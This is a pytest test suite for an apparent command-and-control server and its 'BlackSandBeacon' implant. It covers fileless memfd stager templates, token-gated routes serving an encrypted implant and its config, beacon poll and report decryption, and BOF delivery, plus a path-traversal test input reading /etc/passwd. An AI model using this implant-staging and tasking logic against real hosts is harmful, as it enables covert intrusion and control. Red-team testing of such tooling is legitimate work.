"""Fileless BlackSandBeacon compatibility contract tests.

Covers the v1.1 fileless upstream integration: the runtime config speaks
the new config schema (master_key_hex + replay window), the deploy command
is a memfd stager over the /s/ implant channel, and the new default poll
(/api/poll/) and report (/report/) URIs route through the BSB key family
with the client id recovered from the encrypted payload.
"""

from __future__ import annotations

import base64
import importlib.util
import os
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
TEST_MASTER_KEY = bytes(range(32))
TEST_CLIENT_ID = "bsbtest_beacon"


def _load_server():
    if _load_server.module is None:  # type: ignore[attr-defined]
        spec = importlib.util.spec_from_file_location("lazyc2_server_bsb_test", str(ROOT / "lazyc2.py"))
        module = importlib.util.module_from_spec(spec)
        old_argv = sys.argv
        sys.argv = ["lazyc2"]
        try:
            spec.loader.exec_module(module)
        finally:
            sys.argv = old_argv
        _load_server.module = module  # type: ignore[attr-defined]
    return _load_server.module  # type: ignore[attr-defined]


_load_server.module = None  # type: ignore[attr-defined]


def _encrypt_bsb_report(payload: bytes, master_key: bytes, counter: int = 1) -> str:
    """Encrypt one beacon report exactly the way the C beacon does."""
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    from modules.bsb_compat import derive_bsb_keys

    enc_key, _ = derive_bsb_keys(master_key)
    envelope = counter.to_bytes(8, "little") + int(__import__("time").time()).to_bytes(8, "little") + payload
    iv = os.urandom(16)
    encryptor = Cipher(algorithms.AES(enc_key), modes.CFB(iv), backend=default_backend()).encryptor()
    ciphertext = encryptor.update(envelope) + encryptor.finalize()
    return base64.b64encode(iv + ciphertext).decode()


@pytest.fixture(scope="module")
def server():
    return _load_server()


@pytest.fixture
def bsb_env(server, monkeypatch, tmp_path):
    """Isolate the beacon channels: test key, no HMAC, sandboxed logging."""
    key_path = tmp_path / "key.aes"
    key_path.write_bytes(TEST_MASTER_KEY)
    monkeypatch.setattr(server, "_AES_KEY_PATH", key_path)
    monkeypatch.setattr(server, "AES_KEY", TEST_MASTER_KEY)
    monkeypatch.setattr(server.config, "c2_require_beacon_hmac", False, raising=False)
    monkeypatch.setattr(server, "_stage_token", lambda: "tok9")
    yield server
    server._bsb_beacon_clients.discard(TEST_CLIENT_ID)


class TestRuntimeConfig:
    def test_config_carries_master_and_legacy_key(self, tmp_path):
        from modules.bof_delivery import BofDeliveryConfig, beacon_runtime_config

        key_path = tmp_path / "key.aes"
        key_hex = bytes(range(32)).hex()
        key_path.write_bytes(bytes(range(32)))
        cfg = BofDeliveryConfig(sessions_dir=tmp_path)
        payload = {"lhost": "10.0.0.1", "c2_port": "8443"}
        document = beacon_runtime_config("blacksandbeacon", "beacon_x", cfg, payload)
        assert document["crypto"]["master_key_hex"] == key_hex
        assert document["crypto"]["aes_key_hex"] == key_hex
        assert document["crypto"]["replay_window_seconds"] == 300

    def test_config_keeps_lazyc2_endpoints(self, tmp_path):
        from modules.bof_delivery import BofDeliveryConfig, beacon_runtime_config

        (tmp_path / "key.aes").write_bytes(bytes(range(32)))
        document = beacon_runtime_config(
            "blacksandbeacon",
            "beacon_x",
            BofDeliveryConfig(sessions_dir=tmp_path),
            {"lhost": "10.0.0.1", "c2_port": "8443"},
        )
        assert document["c2"]["url"] == "https://10.0.0.1:8443"
        assert document["c2"]["uri"] == "/command/"
        assert document["c2"]["report_uri"] == "/command/beacon_x"

    def test_config_requires_key(self, tmp_path):
        from modules.bof_delivery import BofDeliveryConfig, beacon_runtime_config

        with pytest.raises(ValueError):
            beacon_runtime_config(
                "blacksandbeacon",
                "beacon_x",
                BofDeliveryConfig(sessions_dir=tmp_path),
                {"lhost": "10.0.0.1", "c2_port": "8443"},
            )


class TestFilelessDeployCommand:
    def test_template_chain_is_diskless_then_disk(self):
        from modules.bof_delivery import _FILELESS_STAGE_TEMPLATES

        assert len(_FILELESS_STAGE_TEMPLATES) >= 3
        assert "stage_payload_b64" in _FILELESS_STAGE_TEMPLATES[0]
        assert "stager_b64" in _FILELESS_STAGE_TEMPLATES[1]
        assert "curl" in _FILELESS_STAGE_TEMPLATES[2]
        for template in _FILELESS_STAGE_TEMPLATES[:2]:
            assert "curl" not in template
            assert "chmod" not in template
            assert "nohup" not in template

    def test_stager_blob_is_memfd_loader(self):
        from modules.bof_delivery import _FILELESS_STAGER_B64

        script = base64.b64decode(_FILELESS_STAGER_B64).decode("utf-8")
        compile(script, "deploy_stager", "exec")
        assert "memfd_create" in script
        assert "execve" in script
        assert "BSB_CONFIG" in script
        assert "/s/blacksandbeacon" in script
        assert "/s/blacksandbeacon_config" in script
        assert "," not in _FILELESS_STAGER_B64

    def test_upstream_stage_payload_available_from_checkout(self):
        from modules.bof_delivery import _stage_payload_b64

        blob = _stage_payload_b64()
        assert blob is not None
        script = base64.b64decode(blob).decode("utf-8")
        compile(script, "upstream_stager", "exec")
        assert "/stage/beacon" in script
        assert "/stage/config" in script
        assert "BSB_STAGE_TOKEN" in script

    def test_chain_formats_without_placeholder_leaks(self):
        from modules.bof_delivery import (
            _FILELESS_STAGE_TEMPLATES,
            _FILELESS_STAGER_B64,
            _stage_payload_b64,
        )

        stage_payload_b64 = _stage_payload_b64() or "x"
        values = {
            "lhost": "10.0.0.1",
            "c2_port": "8443",
            "target_path": "/tmp/.svc",
            "config_path": "/tmp/config.json",
            "binary_name": "blacksandbeacon",
            "config_name": "blacksandbeacon_config",
            "stager_b64": _FILELESS_STAGER_B64,
            "stage_payload_b64": stage_payload_b64,
            "stage_token": "abcd1234",
        }
        for template in _FILELESS_STAGE_TEMPLATES:
            if "stage_payload_b64" in template and not values["stage_payload_b64"]:
                continue
            line = template.format(**values)
            assert "{" not in line.replace("{}", "")
            assert "10.0.0.1:8443" in line


class TestStageCrypto:
    def test_stage_blob_roundtrip_matches_upstream_decoder(self):
        from modules.bsb_compat import decrypt_bsb_stage_blob, encrypt_bsb_stage_blob

        payload = os.urandom(96)
        blob = encrypt_bsb_stage_blob(payload, "tok123")
        raw = base64.b64decode(blob)
        assert len(raw) >= 16 + 32
        tag, body = raw[-32:], raw[:-32]
        iv, ciphertext = body[:16], body[16:]
        assert decrypt_bsb_stage_blob(blob, "tok123") == payload

    def test_stage_blob_rejects_wrong_token(self):
        from modules.bsb_compat import decrypt_bsb_stage_blob, encrypt_bsb_stage_blob

        blob = encrypt_bsb_stage_blob(b"data", "right-token")
        with pytest.raises(ValueError):
            decrypt_bsb_stage_blob(blob, "wrong-token")

    def test_stage_keys_fail_closed_on_empty_token(self):
        from modules.bsb_compat import derive_bsb_stage_keys

        with pytest.raises(ValueError):
            derive_bsb_stage_keys("")


class TestStageRoutes:
    def test_stage_beacon_serves_elf_under_token(self, server, bsb_env, monkeypatch, tmp_path):
        fake_elf = b"\x7fELF" + os.urandom(64)
        monkeypatch.setattr(server, "_staged_beacon_candidates", lambda: [str(tmp_path / "beacon")])
        (tmp_path / "beacon").write_bytes(fake_elf)
        client = server.app.test_client()
        response = client.get("/stage/beacon", headers={"Authorization": "Bearer tok9"})
        assert response.status_code == 200
        from modules.bsb_compat import decrypt_bsb_stage_blob

        assert decrypt_bsb_stage_blob(response.get_data(), "tok9") == fake_elf

    def test_stage_beacon_rejects_bad_token(self, server, bsb_env, monkeypatch, tmp_path):
        monkeypatch.setattr(server, "_staged_beacon_candidates", lambda: [str(tmp_path / "beacon")])
        (tmp_path / "beacon").write_bytes(b"\x7fELF" + b"x" * 16)
        client = server.app.test_client()
        assert client.get("/stage/beacon", headers={"Authorization": "Bearer nope"}).status_code == 403
        assert client.get("/stage/beacon").status_code == 403

    def test_stage_beacon_fails_without_elf(self, server, bsb_env, monkeypatch, tmp_path):
        monkeypatch.setattr(server, "_staged_beacon_candidates", lambda: [str(tmp_path / "missing")])
        client = server.app.test_client()
        response = client.get("/stage/beacon", headers={"Authorization": "Bearer tok9"})
        assert response.status_code == 503

    def test_stage_config_carries_c2_contract(self, server, bsb_env, monkeypatch, tmp_path):
        key_path = tmp_path / "key.aes"
        key_path.write_bytes(TEST_MASTER_KEY)
        payload = {
            "lhost": "10.1.2.3",
            "c2_port": "8443",
            "beacon_client_id": TEST_CLIENT_ID,
        }
        monkeypatch.setattr("core.config.load_payload", lambda: payload)
        import dataclasses as _dataclasses

        import modules.bof_delivery as delivery

        @_dataclasses.dataclass
        class _TmpConfig(delivery.BofDeliveryConfig):
            def __post_init__(self):
                self.sessions_dir = tmp_path

        monkeypatch.setattr(delivery, "BofDeliveryConfig", _TmpConfig)
        client = server.app.test_client()
        response = client.get("/stage/config", headers={"Authorization": "Bearer tok9"})
        assert response.status_code == 200
        import json as _json

        from modules.bsb_compat import decrypt_bsb_stage_blob

        document = _json.loads(decrypt_bsb_stage_blob(response.get_data(), "tok9"))
        assert document["c2"]["url"] == "https://10.1.2.3:8443"
        assert document["c2"]["client_id"] == TEST_CLIENT_ID
        assert document["crypto"]["master_key_hex"] == TEST_MASTER_KEY.hex()


class TestBofRoute:
    def test_bof_serves_raw_base64(self, server, bsb_env, monkeypatch, tmp_path):
        obj = b"\x7fELF-relocatable" + os.urandom(16)
        bofs = tmp_path / "temp_uploads" / "bofs"
        bofs.mkdir(parents=True)
        (bofs / "whoami.x64.o").write_bytes(obj)
        monkeypatch.setattr(server, "SESSIONS_DIR", str(tmp_path))
        client = server.app.test_client()
        response = client.get("/bof/whoami.x64.o")
        assert response.status_code == 200
        assert base64.b64decode(response.get_data().strip()) == obj
        assert response.get_data().endswith(b"\r\n")

    def test_bof_rejects_traversal(self, server, bsb_env, monkeypatch, tmp_path):
        monkeypatch.setattr(server, "SESSIONS_DIR", str(tmp_path))
        client = server.app.test_client()
        response = client.get("/bof/../../etc/passwd")
        assert response.get_data() == b"BOF_NOT_FOUND\r\n"

    def test_bof_missing_object(self, server, bsb_env, monkeypatch, tmp_path):
        monkeypatch.setattr(server, "SESSIONS_DIR", str(tmp_path))
        client = server.app.test_client()
        assert client.get("/bof/ghost.x64.o").get_data() == b"BOF_NOT_FOUND\r\n"


class TestPollRoute:
    def test_poll_get_marks_bsb_and_delegates(self, server, bsb_env, monkeypatch):
        calls = []
        monkeypatch.setattr(server, "send_command", lambda cid: calls.append(cid) or "poll-response")
        client = server.app.test_client()
        response = client.get(f"/api/poll/{TEST_CLIENT_ID}")
        assert response.status_code == 200
        assert response.get_data(as_text=True) == "poll-response"
        assert calls == [TEST_CLIENT_ID]
        assert TEST_CLIENT_ID in server._bsb_beacon_clients

    def test_poll_post_marks_bsb_and_delegates(self, server, bsb_env, monkeypatch):
        calls = []
        monkeypatch.setattr(server, "receive_result", lambda cid: calls.append(cid) or "result-response")
        client = server.app.test_client()
        response = client.post(f"/api/poll/{TEST_CLIENT_ID}", data=b"x")
        assert response.status_code == 200
        assert calls == [TEST_CLIENT_ID]
        assert TEST_CLIENT_ID in server._bsb_beacon_clients


class TestReportRoute:
    def test_report_recovers_client_from_payload(self, server, bsb_env, monkeypatch):
        import json as _json

        forward_calls = []
        monkeypatch.setattr(
            server, "receive_result", lambda cid: forward_calls.append(cid) or "forwarded"
        )
        report = _json.dumps(
            {
                "output": "ok",
                "client": TEST_CLIENT_ID,
                "command": "id",
                "pid": 1,
                "hostname": "h",
                "ips": "127.0.0.1",
                "user": "u",
                "discovered_ips": "",
                "result_portscan": None,
                "result_pwd": "/",
            }
        ).encode()
        body = _encrypt_bsb_report(report, TEST_MASTER_KEY, counter=7)
        client = server.app.test_client()
        response = client.post("/report/", data=body.encode())
        assert response.status_code == 200
        assert response.get_data(as_text=True) == "forwarded"
        assert forward_calls == [TEST_CLIENT_ID]
        assert TEST_CLIENT_ID in server._bsb_beacon_clients

    def test_report_garbage_is_rejected(self, server, bsb_env):
        client = server.app.test_client()
        response = client.post("/report/", data=b"not-a-bsb-report")
        assert response.status_code == 400

    def test_report_without_client_id_is_rejected(self, server, bsb_env, monkeypatch):
        import json as _json

        monkeypatch.setattr(server, "receive_result", lambda cid: "forwarded")
        report = _json.dumps({"client": "", "output": "x"}).encode()
        body = _encrypt_bsb_report(report, TEST_MASTER_KEY, counter=9)
        client = server.app.test_client()
        response = client.post("/report/", data=body.encode())
        assert response.status_code == 400

    def test_report_malleable_alias_routes(self, server, bsb_env, monkeypatch):
        import json as _json

        monkeypatch.setattr(server, "receive_result", lambda cid: "forwarded")
        report = _json.dumps(
            {
                "output": "ok",
                "client": TEST_CLIENT_ID,
                "command": "id",
                "pid": 1,
                "hostname": "h",
                "ips": "127.0.0.1",
                "user": "u",
                "discovered_ips": "",
                "result_portscan": None,
                "result_pwd": "/",
            }
        ).encode()
        body = _encrypt_bsb_report(report, TEST_MASTER_KEY, counter=11).encode()
        route = f"{server.route_malleable}report/"
        client = server.app.test_client()
        response = client.post(route, data=body)
        assert response.status_code == 200
